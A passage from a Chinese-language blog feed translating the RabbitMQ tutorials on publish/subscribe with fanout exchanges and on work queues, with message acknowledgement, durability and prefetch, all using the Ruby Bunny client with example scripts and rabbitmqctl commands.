    <content type="html"><![CDATA[<h1 id="RabbitMQ教程（三）──发布、订阅"><a href="#RabbitMQ教程（三）──发布、订阅" class="headerlink" title="RabbitMQ教程（三）──发布、订阅"></a>RabbitMQ教程（三）──发布、订阅</h1><p>（使用Bunny）</p><p>在上篇教程中，我们搭建了一个工作队列，每个任务只分发给一个工作者（worker）。在本篇教程中，我们要做的跟之前完全不一样 —— 分发一个消息给多个消费者（consumers）。这种模式被称为“发布／订阅”。</p><p>为了描述这种模式，我们将会构建一个简单的日志系统。它包括两个程序——第一个程序负责发送日志消息，第二个程序负责获取消息并输出内容。</p><p>在我们的这个日志系统中，所有正在运行的接收方程序都会接受消息。我们用其中一个接收者（receiver）把日志写入硬盘中，另外一个接受者（receiver）把日志输出到屏幕上。</p><p>最终，日志消息被广播给所有的接受者（receivers）。</p><h1 id="交换机（Exchanges）"><a href="#交换机（Exchanges）" class="headerlink" title="交换机（Exchanges）"></a>交换机（Exchanges）</h1><p>前面的教程中，我们发送消息到队列并从中取出消息。现在是时候介绍RabbitMQ中完整的消息模型了。</p><p>让我们简单的概括一下之前的教程：</p><ul><li>发布者（producer）是发布消息的应用程序。</li><li>队列（queue）用于消息存储的缓冲。</li><li>消费者（consumer）是接收消息的应用程序。</li></ul><p>RabbitMQ消息模型的核心理念是：发布者（producer）不会直接发送任何消息给队列。事实上，发布者（producer）甚至不知道消息是否已经被投递到队列。</p><p>发布者（producer）只需要把消息发送给一个交换机（exchange）。交换机非常简单，它一边从发布者方接收消息，一边把消息推送到队列。交换机必须知道如何处理它接收到的消息，是应该推送到指定的队列还是是多个队列，或者是直接忽略消息。这些规则是通过交换机类型（exchange type）来定义的。</p><p><img src="https://www.rabbitmq.com/img/tutorials/exchanges.png" alt="exchanges"></p><p>有几个可供选择的交换机类型：直连交换机（direct）, 主题交换机（topic）, （头交换机）headers和 扇型交换机（fanout）。我们在这里主要说明最后一个 —— 扇型交换机（fanout）。先创建一个fanout类型的交换机，命名为<code>logs</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.fanout(<span class="string">'logs'</span>)</span><br></pre></td></tr></table></figure></p><p>扇型交换机（fanout）很简单，你可能从名字上就能猜测出来，它把消息发送给它所知道的所有队列。这正是我们的日志系统所需要的。</p><blockquote><p><strong>交换器列表</strong></p><p><code>rabbitmqctl</code>能够列出服务器上所有的交换器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rabbitmqctl list_exchanges</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>这个列表中有一些叫做amq.*的交换器。这些都是默认创建的，不过这时候你还不需要使用他们。</p></blockquote><blockquote><p><strong>默认的交换器</strong></p><p>前面的教程中我们对交换机一无所知，但仍然能够发送消息到队列中。因为我们使用了命名为空字符串(“”)默认的交换机。</p><p>回想我们之前是如何发布一则消息：</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.default_exchange.publish(<span class="string">'hello'</span>, <span class="symbol">routing_key:</span> <span class="string">'hello'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>exchange参数就是交换机的名称。空字符串代表默认或者匿名交换机：消息将会根据指定的routing_key分发到指定的队列。</p></blockquote><p>现在，我们就可以发送消息到一个具名交换机了：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exchange = channel.fanout(<span class="string">'logs'</span>)</span><br><span class="line">exchange.publish(message)</span><br></pre></td></tr></table></figure></p><h2 id="临时队列"><a href="#临时队列" class="headerlink" title="临时队列"></a>临时队列</h2><p>你还记得之前我们使用的队列名吗（ hello和task_queue）？给一个队列命名是很重要的——我们需要把工作者（workers）指向正确的队列。如果你打算在发布者（producers）和消费者（consumers）之间共享同队列的话，给队列命名是十分重要的。</p><p>但是这并不适用于我们的日志系统。我们打算接收所有的日志消息，而不仅仅是一小部分。我们关心的是最新的消息而不是旧的。为了解决这个问题，我们需要做两件事情。</p><p>首先，当我们连接上RabbitMQ的时候，我们需要一个全新的、空的队列。我们可以手动创建一个随机的队列名，或者让服务器为我们选择一个随机的队列名（推荐）。</p><p>第二步，当与消费者（consumer）断开连接的时候，这个队列应当被立即删除。</p><p>在Bunny客户端中，我们假设创建一个空名的队列，会得到自动命名的队列：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><p>这时候我们可以通过result.method.queue获得已经生成的随机队列名。它可能是这样子的：<code>amq.gen-JzTY20BRgKO-HjmUJj0wLg</code>。</p><p>因为这个队列被声明为<code>exclusive</code>，当连接关闭时，这个队列自动被删除。关于队列的其他属性可以查看<a href="https://www.rabbitmq.com/queues.html" target="_blank" rel="noopener">文档</a>。</p><h2 id="绑定（Bindings）"><a href="#绑定（Bindings）" class="headerlink" title="绑定（Bindings）"></a>绑定（Bindings）</h2><p><img src="https://www.rabbitmq.com/img/tutorials/bindings.png" alt="bindings"></p><p>我们已经创建了一个扇型交换机（fanout）和一个队列。现在我们需要告诉交换机如何发送消息给我们的队列。交换器和队列之间的联系我们称之为绑定（binding）。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue.bind(<span class="string">'logs'</span>)</span><br></pre></td></tr></table></figure></p><p>现在，<code>logs</code>交换机将会把消息添加到我们的队列中。</p><blockquote><p><strong>绑定（binding）列表</strong></p><p>你可以使用rabbitmqctl list_bindings 列出所有现存的绑定。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl list_bindings</span><br></pre></td></tr></table></figure><h2 id="代码整合"><a href="#代码整合" class="headerlink" title="代码整合"></a>代码整合</h2><p><img src="https://www.rabbitmq.com/img/tutorials/python-three-overall.png" alt="python-three-overall"></p><p>发布日志消息的程序看起来和之前的没有太大区别。最重要的改变就是我们把消息发送给<code>logs</code>交换机而不是匿名交换机。以下是<code>emit_log.rb</code>脚本：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">exchange = channel.fanout(<span class="string">'logs'</span>)</span><br><span class="line"></span><br><span class="line">message = ARGV.empty? ? <span class="string">'Hello World!'</span> : ARGV.join(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">exchange.publish(message)</span><br><span class="line">puts <span class="string">" [x] Sent <span class="subst">#&#123;message&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">connection.close</span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/emit_log.rb" target="_blank" rel="noopener">(emit_log.py 源文件)</a></p><p>正如你看到的那样，在连接成功之后，我们声明了一个交换器，这一个是很重要的，因为不允许发布消息到不存在的交换器。</p><p>如果没有绑定队列到交换器，消息将会丢失。但这个没有所谓，如果没有消费者监听，那么消息就会被忽略。</p><p><code>receive_logs.rb</code>的代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">exchange = channel.fanout(<span class="string">'logs'</span>)</span><br><span class="line">queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">queue.bind(exchange)</span><br><span class="line"></span><br><span class="line">puts <span class="string">' [*] Waiting for logs. To exit press CTRL+C'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|_delivery_info, _properties, body|</span></span><br><span class="line">    puts <span class="string">" [x] <span class="subst">#&#123;body&#125;</span>"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  channel.close</span><br><span class="line">  connection.close</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive_logs.rb" target="_blank" rel="noopener">(receive_logs.py source)</a></p><p>这样我们就完成了。如果你想把日志保存到文件中，只需要打开控制台输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby receive_logs.rb &gt; logs_from_rabbit.log</span><br></pre></td></tr></table></figure></p><p>如果你想在屏幕中查看日志，那么打开一个新的终端然后运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby receive_logs.rb</span><br></pre></td></tr></table></figure></p><p>当然还要发送日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby emit_log.rb</span><br></pre></td></tr></table></figure></p><p>使用<code>rabbitmqctl list_bindings</code>你可确认已经创建的队列绑定。你可以看到运行中的两个<code>receive_logs.rb</code>程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl list_bindings</span><br><span class="line"><span class="comment"># =&gt; Listing bindings ...</span></span><br><span class="line"><span class="comment"># =&gt; logs    exchange        amq.gen-JzTY20BRgKO-HjmUJj0wLg  queue           []</span></span><br><span class="line"><span class="comment"># =&gt; logs    exchange        amq.gen-vso0PVvyiRIL2WoV3i48Yg  queue           []</span></span><br><span class="line"><span class="comment"># =&gt; ...done.</span></span><br></pre></td></tr></table></figure></p><p>显示结果很直观：<code>logs</code>交换器把数据发送给两个系统命名的队列。这就是我们所期望的。</p><p>如何监听消息的子集呢？让我们移步教程四。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RabbitMQ教程（三）──发布、订阅&quot;&gt;&lt;a href=&quot;#RabbitMQ教程（三）──发布、订阅&quot; class=&quot;headerlink&quot; title=&quot;RabbitMQ教程（三）──发布、订阅&quot;&gt;&lt;/a&gt;RabbitMQ教程（三）──发布、订阅&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="RabbitMQ" scheme="http://jack0pan.github.io/tags/RabbitMQ/"/>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
      <category term="翻译" scheme="http://jack0pan.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ教程（二）──工作队列</title>
    <link href="http://jack0pan.github.io/2017/10/02/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%94%80%E2%94%80%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97/"/>
    <id>http://jack0pan.github.io/2017/10/02/RabbitMQ教程（二）──工作队列/</id>
    <published>2017-10-02T14:15:26.000Z</published>
    <updated>2018-04-13T15:18:28.447Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RabbitMQ教程（二）──工作队列"><a href="#RabbitMQ教程（二）──工作队列" class="headerlink" title="RabbitMQ教程（二）──工作队列"></a>RabbitMQ教程（二）──工作队列</h1><p>（使用<a href="http://rubybunny.info/" target="_blank" rel="noopener">Bunny</a>）</p><p><img src="https://www.rabbitmq.com/img/tutorials/python-two.png" alt="python-two"></p><p>在第一篇教程中，我们已经写了一个从已知队列中发送和获取消息的程序。在这篇教程中，我们将创建一个工作队列（Work Queue），它会发送一些耗时的任务给多个工作者（Worker）。</p><p>工作队列（又称：任务队列——Task Queues）是为了避免等待一些占用大量资源、时间的操作。当我们把任务（Task）当作消息发送到队列中，一个运行在后台的工作者（worker）进程就会取出任务然后处理。当你运行多个工作者（workers），任务就会在它们之间共享。</p><p>这个概念在网络应用中是非常有用的，它可以在短暂的HTTP请求中处理一些复杂的任务。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>之前的教程中，我们发送了一个包含“Hello World!”的字符串消息。现在，我们将发送一些字符串，把这些字符串当作复杂的任务。我们没有真实的例子，例如图片缩放、pdf文件转换。所以使用<code>Kernel#sleep</code>函数来模拟这种情况。我们在字符串中加上点号（.）来表示任务的复杂程度，一个点（.）将会耗时1秒钟。比如”Hello…”就会耗时3秒钟。</p><p>我们对之前教程的<code>send.rb</code>做些简单的调整，以便可以发送随意的消息。这个程序会按照计划发送任务到我们的工作队列中。我们把它命名为<code>new_task.rb</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message = ARGV.empty? ? <span class="string">'Hello World!'</span> : ARGV.join(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">queue.publish(message, <span class="symbol">persistent:</span> <span class="literal">true</span>)</span><br><span class="line">puts <span class="string">" [x] Sent <span class="subst">#&#123;message&#125;</span>"</span></span><br></pre></td></tr></table></figure></p><p>我们的旧脚本<code>receive.rb</code>同样需要做一些改动：它需要为消息体中每一个点号（.）模拟1秒钟的操作。它会从队列中获取消息并执行，我们把它命名为<code>worker.rb</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|delivery_info, _properties, body|</span></span><br><span class="line">  puts <span class="string">" [x] Received <span class="subst">#&#123;body&#125;</span>"</span></span><br><span class="line">  <span class="comment"># imitate some work</span></span><br><span class="line">  sleep body.count(<span class="string">'.'</span>).to_i</span><br><span class="line">  puts <span class="string">' [x] Done'</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>注意我们假装执行了任务所需要的时间。</p><p>现在想教程一那样来运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 1</span></span><br><span class="line">ruby worker.rb</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 2</span></span><br><span class="line">ruby new_task.rb</span><br></pre></td></tr></table></figure><h2 id="循环调度"><a href="#循环调度" class="headerlink" title="循环调度"></a>循环调度</h2><p>使用工作队列的一个好处就是它能够并行的处理队列。如果堆积了很多任务，我们只需要添加更多的工作者（workers）就可以了，扩展很简单。</p><p>首先，我们先同时运行两个<code>worker.rb</code>脚本，它们都会从队列中获取消息，到底是不是这样呢？我们看看。</p><p>你需要打开三个终端，两个用来运行<code>worker.rb</code>脚本，这两个终端就是我们的两个消费者（consumers）—— C1 和 C2。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 1</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 2</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br></pre></td></tr></table></figure><p>第三个终端，我们用来发布新任务。你可以发送一些消息给消费者（consumers）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 3</span></span><br><span class="line">ruby new_task.rb First message.</span><br><span class="line">ruby new_task.rb Second message..</span><br><span class="line">ruby new_task.rb Third message...</span><br><span class="line">ruby new_task.rb Fourth message....</span><br><span class="line">ruby new_task.rb Fifth message.....</span><br></pre></td></tr></table></figure></p><p>看看到底发送了什么给我们的工作者（workers）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 1</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'First message.'</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Third message...'</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Fifth message.....'</span></span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 2</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Second message..'</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Fourth message....'</span></span><br></pre></td></tr></table></figure><p>默认来说，RabbitMQ会按顺序得把消息发送给每个消费者（consumer）。平均每个消费者都会收到同等数量得消息。这种发送消息得方式叫做——轮询（round-robin）。试着添加三个或更多得工作者（workers）。</p><h2 id="消息确认"><a href="#消息确认" class="headerlink" title="消息确认"></a>消息确认</h2><p>当处理一个比较耗时得任务的时候，你也许想知道消费者（consumers）是否运行到一半就挂掉。当前的代码中，当消息被RabbitMQ发送给消费者（consumers）之后，马上就会在内存中移除。这种情况，你只要把一个工作者（worker）停止，正在处理的消息就会丢失。同时，所有发送到这个工作者的还没有处理的消息都会丢失。</p><p>我们不想丢失任何任务消息。如果一个工作者（worker）挂掉了，我们希望任务会重新发送给其他的工作者（worker）。</p><p>为了防止消息丢失，RabbitMQ提供了<a href="https://www.rabbitmq.com/confirms.html" target="_blank" rel="noopener">消息响应</a>。消费者会通过一个ack（响应），告诉RabbitMQ已经收到并处理了某条消息，然后RabbitMQ就会释放并删除这条消息。</p><p>如果消费者（consumer）挂掉了（通道关闭，连接关闭，或者TCP连接关闭），没有发送响应，RabbitMQ就会认为消息没有被完全处理，然后重新发送给其他消费者（consumer）。这样，及时工作者（workers）偶尔的挂掉，也不会丢失消息。</p><p>消息是没有超时这个概念的；当工作者与它断开连的时候，RabbitMQ会重新发送消息。这样在处理一个耗时非常长的消息任务的时候就不会出问题了。</p><p>消息响应默认是开启的。之前的例子中我们可以使用<code>:manual_ack</code>标识把它关闭。是时候移除这个标识了，当工作者（worker）完成了任务，就发送一个响应。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">queue.subscribe(<span class="symbol">manual_ack:</span> <span class="literal">true</span>, <span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|delivery_info, _properties, body|</span></span><br><span class="line">  puts <span class="string">" [x] Received '<span class="subst">#&#123;body&#125;</span>'"</span></span><br><span class="line">  <span class="comment"># imitate some work</span></span><br><span class="line">  sleep body.count(<span class="string">'.'</span>).to_i</span><br><span class="line">  puts <span class="string">' [x] Done'</span></span><br><span class="line">  channel.ack(delivery_info.delivery_tag)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>运行上面的代码，我们发现即使使用CTRL+C杀掉了一个工作者（worker）进程，消息也不会丢失。当工作者（worker）挂掉这后，所有没有响应的消息都会重新发送。</p><p>确认必须返回给相同的通道上。试着将确认发送给不同的通道，那会抛出一个通道级别的异常。查看<a href="https://www.rabbitmq.com/confirms.html" target="_blank" rel="noopener">文档</a>了解更多信息。</p><blockquote><p><strong>忘记确认</strong></p><p>一个很容易犯的错误就是忘了basic_ack，后果很严重。消息在你的程序退出之后就会重新发送，如果它不能够释放没响应的消息，RabbitMQ就会占用越来越多的内存。</p><p>为了排除这种错误，你可以使用<code>rabbitmqctl</code>命令，输出<code>messages_unacknowledged</code>字段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rabbitmqctl list_queues name messages_ready messages_unacknowledged</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Windows系统上去掉<code>sudo</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl.bat list_queues name messages_ready messages_unacknowledged</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="消息持久化"><a href="#消息持久化" class="headerlink" title="消息持久化"></a>消息持久化</h2><p>如果你没有特意告诉RabbitMQ，那么在它退出或者崩溃的时候，将会丢失所有队列和消息。为了确保信息不会丢失，有两个事情是需要注意的：我们必须把“队列”和“消息”设为持久化。</p><p>首先，为了不让队列消失，需要把队列声明为持久化（durable）：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.queue(<span class="string">'hello'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><p>尽管这行代码本身是正确的，但是仍然不会正确运行。因为我们已经定义过一个叫hello的非持久化队列。RabbitMq不允许你使用不同的参数重新定义一个队列，它会返回一个错误。但我们现在使用一个快捷的解决方法——用不同的名字，例如<code>task_queue</code>。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.queue(<span class="string">'task_queue'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><p>这个<code>:durable</code>必须在生产者（producer）和消费者（consumer）对应的代码中修改。</p><p>这时候，我们就可以确保在RabbitMq重启之后<code>task_queue</code>队列不会丢失。另外，我们需要把我们的消息也要设为持久化——使用<code>Bunny::Exchange#publish</code>的<code>:persistent</code>选项。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exchange.publish(message, <span class="symbol">persistent:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>注意：消息持久化</strong></p><p>将消息设为持久化并不能完全保证不会丢失。以上代码只是告诉了RabbitMq要把消息存到硬盘，但从RabbitMq收到消息到保存之间还是有一个很小的间隔时间。因为RabbitMq并不是所有的消息都使用<code>fsync(2)</code>——它有可能只是保存到缓存中，并不一定会写到硬盘中。并不能保证真正的持久化，但已经足够应付我们的简单工作队列。如果你一定要保证持久化，你可以使用<a href="https://www.rabbitmq.com/confirms.html" target="_blank" rel="noopener">publisher confirms</a>。</p></blockquote><h2 id="公平调度"><a href="#公平调度" class="headerlink" title="公平调度"></a>公平调度</h2><p>你应该已经发现，它仍旧没有按照我们期望的那样进行分发。比如有两个工作者（workers），处理奇数消息的比较繁忙，处理偶数消息的比较轻松。然而RabbitMQ并不知道这些，它仍然一如既往的派发消息。</p><p>这时因为RabbitMQ只管分发进入队列的消息，不会关心有多少消费者（consumer）没有作出响应。它盲目的把第n-th条消息发给第n-th个消费者。</p><p><img src="https://www.rabbitmq.com/img/tutorials/prefetch-count.png" alt="prefetch-count"></p><p>我们可以使用<code>prefetch</code>函数，并传递参数为1。这样是告诉RabbitMQ，再同一时刻，不要发送超过1条消息给一个工作者（worker），直到它已经处理了上一条消息并且作出了响应。这样，RabbitMQ就会把消息分发给下一个空闲的工作者（worker）。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">1</span>;</span><br><span class="line">channel.prefetch(n);</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>关于队列大小</strong></p><p>如果所有的工作者都处理繁忙状态，你的队列就会被填满。你需要留意这个问题，要么添加更多的工作者（workers），要么使用其他策略。</p></blockquote><h2 id="整合代码"><a href="#整合代码" class="headerlink" title="整合代码"></a>整合代码</h2><p><code>new_task.rb</code>的完整代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new(<span class="symbol">automatically_recover:</span> <span class="literal">false</span>)</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">queue = channel.queue(<span class="string">'task_queue'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">message = ARGV.empty? ? <span class="string">'Hello World!'</span> : ARGV.join(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">queue.publish(message, <span class="symbol">persistent:</span> <span class="literal">true</span>)</span><br><span class="line">puts <span class="string">" [x] Sent <span class="subst">#&#123;message&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">connection.close</span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/new_task.rb" target="_blank" rel="noopener">(new_task.rb 源码)</a></p><p>我们的<code>worker.rb</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new(<span class="symbol">automatically_recover:</span> <span class="literal">false</span>)</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">queue = channel.queue(<span class="string">'task_queue'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">channel.prefetch(<span class="number">1</span>)</span><br><span class="line">puts <span class="string">' [*] Waiting for messages. To exit press CTRL+C'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  queue.subscribe(<span class="symbol">manual_ack:</span> <span class="literal">true</span>, <span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|delivery_info, _properties, body|</span></span><br><span class="line">    puts <span class="string">" [x] Received '<span class="subst">#&#123;body&#125;</span>'"</span></span><br><span class="line">    <span class="comment"># imitate some work</span></span><br><span class="line">    sleep body.count(<span class="string">'.'</span>).to_i</span><br><span class="line">    puts <span class="string">' [x] Done'</span></span><br><span class="line">    channel.ack(delivery_info.delivery_tag)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  connection.close</span><br><span class="line"><span 